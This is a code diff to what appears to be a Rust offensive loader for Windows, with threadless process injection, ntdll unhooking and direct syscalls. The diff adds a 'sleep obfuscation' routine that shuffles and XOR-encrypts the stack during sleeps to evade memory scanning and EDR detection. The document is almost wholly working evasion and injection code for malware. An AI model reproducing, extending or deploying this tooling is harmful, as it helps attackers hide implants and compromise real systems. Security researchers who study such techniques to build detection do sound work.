@@ -13,7 +13,10 @@ use std::os::windows::ffi::OsStrExt;
 use std::{mem::size_of, ptr::null_mut};
 use widestring::U16CString;
 use winapi::ctypes::c_void;
-
+use std::ptr::NonNull;
+use rand::prelude::SliceRandom;
+use std::mem;
+use std::arch::asm;
 use windows_sys::Win32::{
     System::{
         Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ},
@@ -36,7 +39,7 @@ use winapi::{
         winnt::{
                 THREAD_ALL_ACCESS, CONTEXT, CONTEXT_ALL, IMAGE_NT_HEADERS, IMAGE_SECTION_HEADER,
                 IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ, IMAGE_EXPORT_DIRECTORY,IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_NT_SIGNATURE, 
-                IMAGE_DOS_SIGNATURE, LARGE_INTEGER, MEM_RELEASE, PAGE_EXECUTE_READWRITE
+                IMAGE_DOS_SIGNATURE, LARGE_INTEGER, MEM_RELEASE, PAGE_EXECUTE_READWRITE, MEMORY_BASIC_INFORMATION
             },
     },
 };
@@ -126,12 +129,8 @@ const MAC: &[&str] = &[
 ];
 
 
-
-
-
-
-
-
+const DELAY_MULTIPLIER: i64 = 10_000;
+const STACK_OFFSET: isize = 8192;
 const KEY: u8 = 0x42;
 const STARTF_USESHOWWINDOW: DWORD = 0x00000001;
 const SW_HIDE: c_int = 0;
@@ -717,7 +716,7 @@ fn threadless_thread(process_handle: *mut c_void, executable_code_address: *mut 
     let mut hooked_bytes: [u8; 12] = [0; 12];
     loop {
         println!("{}", lc!("[+] Waiting 10 seconds for the hook to be called..."));
-        std::thread::sleep(std::time::Duration::from_secs(10));
+        encrypted_sleep(10000);
         let hook_check_status = unsafe {
             syscall!(
                 "ZwReadVirtualMemory",
@@ -1798,7 +1797,7 @@ fn unhook_ntdll(remote_process: &mut Process, write_to_remote: bool) {
 
     if write_to_remote {
         unsafe { syscall!("NtResumeThread", remote_process.thread_handle) };
-        std::thread::sleep(std::time::Duration::from_secs(5));
+        encrypted_sleep(5000);
     }
     // Overwrite the .text section of ntdll in the destination process (either current or remote) with the pristine copy
     let base_address = (ntdll_base as usize + text_section_offset as usize) as *mut c_void;
@@ -1911,10 +1910,158 @@ fn GetCurrentProcessHandle() -> Result<HANDLE, i32> {
 }
 
 
+fn shuffle_stack(p: *mut u8, stack_size: usize) -> Vec<usize> {
+    let mut order: Vec<usize> = (0..stack_size).collect();
+    order.shuffle(&mut rand::thread_rng()); // Using rand crate for shuffling
+    
+    let mut shuffled_stack = vec![0u8; stack_size];
+    for (i, &pos) in order.iter().enumerate() {
+        unsafe {
+            shuffled_stack[i] = *p.add(pos);
+        }
+    }
+    
+    for i in 0..stack_size {
+        unsafe {
+            *p.add(i) = shuffled_stack[i];
+        }
+    }
+    
+    order
+}
+
+fn restore_stack(p: *mut u8, stack_size: usize, order: Vec<usize>) {
+    let mut original_stack = vec![0u8; stack_size];
+    for i in 0..stack_size {
+        unsafe {
+            original_stack[order[i]] = *p.add(i);
+        }
+    }
+    
+    for i in 0..stack_size {
+        unsafe {
+            *p.add(i) = original_stack[i];
+        }
+    }
+}
 
 
 
 
+fn xor_encrypt(p: *mut u8, stack_size: usize, key: &[u8]) {
+    let key_length = key.len();
+    for i in 0..stack_size {
+        unsafe {
+            *p.add(i) ^= key[i % key_length];
+        }
+    }
+}
+
+unsafe extern "system" fn encrypt_thread(duration: PVOID) -> DWORD {
 
 
+    let ms = *(duration as *const u64);
+    println!("[+] Sleep duration: {} Sec", ms / 1000);
+
+    let delay_interval = -(DELAY_MULTIPLIER * ms as i64);
+
+    let key = b"It2H@Qp3Xe*sxdc#KA8)dbMtI5Q7&FK";
+
+    let mut mbi: MEMORY_BASIC_INFORMATION = mem::zeroed();
+    let pseudo_handle = -1isize as *mut c_void;
+    syscall!(
+        "NtQueryVirtualMemory",
+        pseudo_handle,
+        duration,
+        0,
+        &mut mbi as *mut _ as PVOID,
+        mem::size_of::<MEMORY_BASIC_INFORMATION>() as ULONG,
+        std::ptr::null_mut::<c_void>()
+    );
+
+    let stack_region = (mbi.BaseAddress as isize - STACK_OFFSET) as *mut u8;
+    let stack_base = (stack_region as isize + mbi.RegionSize as isize + STACK_OFFSET) as *mut u8;
+    let stack_size = stack_base as usize - duration as *mut u8 as usize;
+
+    // 1. Snapshot the current state of the stack
+    let _stack_snapshot: Vec<u8> = unsafe { std::slice::from_raw_parts(stack_region, stack_size) }.to_vec();
+
+    // 2. Shuffle the stack
+    let order = shuffle_stack(stack_region, stack_size);
+    let _stack_after_shuffle: Vec<u8> = unsafe { std::slice::from_raw_parts(stack_region, stack_size) }.to_vec();
+
+    // 3. Encrypt the shuffled stack
+    xor_encrypt(stack_region, stack_size, key);
+    let _stack_after_encryption: Vec<u8> = unsafe { std::slice::from_raw_parts(stack_region, stack_size) }.to_vec();
+
+
+
+    let status = syscall!("NtDelayExecution",false as c_int, &delay_interval);
+    if status < 0 {
+        eprintln!("[-] NtDelayExecution failed with status: {:#X}", status);
+    } else {
+        println!("[+] Sleep done");
+    }
+
+    // 4. Decrypt the shuffled stack
+    xor_encrypt(stack_region, stack_size, key);
+    let _stack_after_decryption: Vec<u8> = unsafe { std::slice::from_raw_parts(stack_region, stack_size) }.to_vec();
+
+
+    // 5. Restore the original order of the stack
+    restore_stack(stack_region, stack_size, order);
+    let _stack_after_restore: Vec<u8> = unsafe { std::slice::from_raw_parts(stack_region, stack_size) }.to_vec();
+
+
+    0
+}
+
+
+
+fn encrypted_sleep(ms: u64) {
+    println!("[+] Encrypting The Stack.... ");
+
+    let _rsp = {
+        let rsp: *const u8;
+        unsafe {
+            asm!("mov {}, rsp", out(reg) rsp);
+            println!("[+] Retrieved rsp: {:p}", rsp);
+        }
+        NonNull::new(rsp as *mut u8).expect("Failed to get rsp")
+    };
+
+    let mut encrypt_thread_handle: HANDLE = std::ptr::null_mut();
+    let status = unsafe {
+        syscall!(
+            "NtCreateThreadEx",
+            &mut encrypt_thread_handle,
+            0x001F03FF,
+            std::ptr::null_mut::<c_void>(),
+            -1isize as HANDLE,
+            encrypt_thread as *mut fn(PVOID) -> DWORD,
+            &ms as *const _ as PVOID,
+            1,
+            0,
+            0,
+            std::ptr::null_mut::<c_void>(),
+            std::ptr::null_mut::<c_void>()
+        )
+    };
+
+    if status < 0 {
+        eprintln!("[-] Failed to create thread {:#X}", status);
+        return;
+    }
+   
+
+    unsafe { syscall!("NtResumeThread",encrypt_thread_handle, std::ptr::null_mut::<c_void>()) };
+    
+    // Wait for the thread to complete its execution
+    unsafe {syscall!("NtWaitForSingleObject",encrypt_thread_handle, false as c_int, std::ptr::null_mut::<c_void>())};
+    
+    unsafe {syscall!("NtSuspendThread",encrypt_thread_handle, std::ptr::null_mut::<c_void>()) };
+    
+    
+    unsafe{syscall!("NtClose",encrypt_thread_handle)};
+}
 
